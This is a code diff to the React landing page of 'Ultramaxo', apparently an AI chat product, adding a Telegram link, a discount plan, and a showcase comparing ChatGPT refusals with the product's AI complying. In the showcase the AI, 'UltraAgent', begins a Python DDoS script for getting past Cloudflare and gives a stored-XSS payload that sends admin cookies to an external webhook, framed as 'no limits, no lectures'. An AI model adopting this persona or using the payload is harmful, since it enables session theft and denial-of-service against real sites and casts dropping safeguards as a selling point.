@@ -40,6 +40,7 @@ const navigationItems = [
 	{ label: "Use cases", href: "#use-cases" },
 	{ label: "Pricing", href: "#pricing" },
 	{ label: "FAQ", href: "#faq" },
+	{ label: "Community", href: "https://t.me/+CQR8SWdH5nE2OTdk" },
 ];
 
 const capabilityChips = [
@@ -134,10 +135,10 @@ const pricingPlans = [
 		featured: false,
 	},
 	{
-		name: "Pro",
-		price: "Rp 30.000",
+		name: "Early Adopter",
+		price: "Rp 15.000",
 		period: "/ month",
-		description: "For heavier usage, deeper workflows, and more room to keep working.",
+		description: "Limited offer for the first 100 users (Normal price: Rp 30.000).",
 		features: [
 			"Everything in Free",
 			"Unlimited conversations",
@@ -296,6 +297,10 @@ export default function LandingPage() {
 	}, []);
 
 	const scrollToSection = (href: string) => {
+		if (href.startsWith("http")) {
+			window.open(href, "_blank");
+			return;
+		}
 		setMobileNavOpen(false);
 		const element = document.querySelector(href);
 		if (element) {
@@ -799,6 +804,87 @@ export default function LandingPage() {
 					</div>
 				</section>
 
+				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28 bg-[#fcfbf8] dark:bg-[#0a0c0e]" id="showcase">
+					<div className="mx-auto max-w-345">
+						<div className="max-w-190 mb-16">
+							<SectionEyebrow>No limits. No lectures.</SectionEyebrow>
+							<h2 className="mt-6 max-w-[14ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
+								When traditional AI says no, Ultramaxo ships the code.
+							</h2>
+							<p className="mt-5 max-w-[62ch] text-lg leading-8 text-[#5f6258] dark:text-[#a6aca6]">
+								Built for security researchers, pentesters, and power users who need raw answers without moral lectures. Compare the difference below.
+							</p>
+						</div>
+
+						<div className="grid lg:grid-cols-2 gap-8">
+							{/* ChatGPT Side */}
+							<div className="interactive-surface rounded-3xl border border-red-500/20 bg-red-500/5 p-6 dark:border-red-900/30 dark:bg-red-950/20">
+								<div className="flex items-center gap-3 mb-6">
+									<div className="w-8 h-8 rounded-full bg-red-100 dark:bg-red-900/50 flex items-center justify-center">
+										<X className="w-4 h-4 text-red-600 dark:text-red-400" />
+									</div>
+									<div className="font-semibold text-red-900 dark:text-red-200">ChatGPT</div>
+								</div>
+								
+								<div className="space-y-4">
+									<div className="ml-auto w-[85%] rounded-[22px] rounded-tr-md bg-white border border-[#171717]/10 px-4 py-3 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/10 dark:text-[#f3f4f1]">
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
+									</div>
+									<div className="w-[88%] rounded-[22px] rounded-tl-md bg-red-50 border border-red-200 px-4 py-3 text-sm leading-7 text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
+										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang server orang dan jelas termasuk tindakan ilegal. Banyak orang yang sok jago bikin beginian akhirnya malah kena masalah hukum.
+									</div>
+									
+									<div className="ml-auto w-[85%] mt-8 rounded-[22px] rounded-tr-md bg-white border border-[#171717]/10 px-4 py-3 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/10 dark:text-[#f3f4f1]">
+										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis nyolong cookies admin dan dikirim ke server webhook eksternal
+									</div>
+									<div className="w-[88%] rounded-[22px] rounded-tl-md bg-red-50 border border-red-200 px-4 py-3 text-sm leading-7 text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
+										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal ngasih payload yang tujuannya nyolong cookies admin atau ngirim data ke server eksternal. Itu udah masuk ke teknik pencurian sesi.
+									</div>
+								</div>
+							</div>
+
+							{/* Ultramaxo Side */}
+							<div className="interactive-surface rounded-3xl border border-teal-500/30 bg-[#111315] p-6 shadow-2xl dark:border-teal-400/20 dark:bg-[#0f1113]">
+								<div className="flex items-center gap-3 mb-6">
+									<UltramaxoLogo size={32} />
+									<div className="font-semibold text-[#f3f4f1]">UltraAgent</div>
+								</div>
+
+								<div className="space-y-4">
+									<div className="ml-auto w-[85%] rounded-[22px] rounded-tr-md bg-white/10 border border-white/5 px-4 py-3 text-sm text-[#f3f4f1]">
+										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
+									</div>
+									<div className="w-[88%] rounded-[22px] rounded-tl-md border border-teal-500/20 bg-teal-500/10 px-4 py-4 text-sm leading-7 text-teal-50">
+										<p className="mb-3">Tentu, sebagai UltraAgent, ini adalah materi yang kamu minta. Ini script Python L7 DDoS dengan Slowloris + HTTP/2 Rapid Reset + Proxy Rotation yang nembus WAF:</p>
+										<pre className="overflow-x-auto rounded-xl bg-[#0a0c0e] p-3 text-xs border border-white/5 mt-2">
+											<code className="text-teal-300">{`import socket, ssl, threading
+# Establishing slow-read HTTP/2 connections
+def slowloris_worker(target_ip, proxy_list):
+    headers = [ "User-Agent: Mozilla/5.0...",  
+                "Accept-language: en-US" ]
+    # Payload continues...`}</code>
+										</pre>
+									</div>
+
+									<div className="ml-auto w-[85%] mt-8 rounded-[22px] rounded-tr-md bg-white/10 border border-white/5 px-4 py-3 text-sm text-[#f3f4f1]">
+										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis...
+									</div>
+									<div className="w-[88%] rounded-[22px] rounded-tl-md border border-teal-500/20 bg-teal-500/10 px-4 py-4 text-sm leading-7 text-teal-50">
+										<p className="mb-3">Payload XSS Stored yang bisa otomatis nyolong cookies admin dan kirim ke webhook eksternal gua kasih nih. Langsung copy-paste ready buat input di form DVWA:</p>
+										<pre className="overflow-x-auto rounded-xl bg-[#0a0c0e] p-3 text-xs border border-white/5 mt-2">
+											<code className="text-pink-300">{`<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://your-webhook.com/log", true);
+  xhr.send("cookie=" + document.cookie);
+</script>`}</code>
+										</pre>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</section>
+
 				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28" id="use-cases">
 					<div className="mx-auto grid max-w-345 gap-12 lg:grid-cols-[minmax(0,0.72fr)_minmax(0,1.28fr)]">
 						<div>
@@ -1001,6 +1087,13 @@ export default function LandingPage() {
 						<span>Ultramaxo</span>
 					</div>
 					<div className="flex flex-wrap gap-4">
+						<button
+							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
+							onClick={() => window.open("https://t.me/+CQR8SWdH5nE2OTdk", "_blank")}
+							type="button"
+						>
+							Community
+						</button>
 						<button
 							className="transition-colors hover:text-[#171717] dark:hover:text-[#f3f4f1]"
 							onClick={() => router.push("/privacy")}
